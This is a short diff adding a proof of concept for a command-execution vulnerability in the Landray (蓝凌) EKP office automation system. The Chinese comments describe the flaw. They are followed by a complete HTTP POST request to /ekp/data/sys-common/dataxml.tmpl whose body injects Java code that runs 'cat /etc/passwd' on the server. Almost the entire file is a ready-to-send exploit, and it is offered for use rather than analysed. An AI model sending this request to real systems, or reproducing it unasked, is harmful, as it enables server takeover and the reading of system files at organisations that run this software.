@@ -1,0 +1,17 @@
+# 蓝凌EKP系统dataxml.tmpl命令执行漏洞
+# 蓝凌OA系统是一套企业级办公自动化软件解决方案，提供了一系列功能模块,帮助企业实现高效的办公管理和协同工作。
+# 蓝凌EKP系统dataxml.tmpl接口存在命令执行漏洞，攻击者通过该漏洞可执行命令获取服务器权限。
+POST /ekp/data/sys-common/dataxml.tmpl?acid=80052393&bid=hd_tag_m8mv2504 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2504
+RM-PRO-Token: 508b3ab9751cd58ac77b869fa49e2a0d
+RM-PRO-Time: 1742808427848
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded
+
+s_bean=ruleFormulaValidate&script=try {
+String cmd = "cat /etc/passwd";
+Process child = Runtime.getRuntime().exec(cmd);
+} catch (IOException e) {
+System.err.println(e);
+}
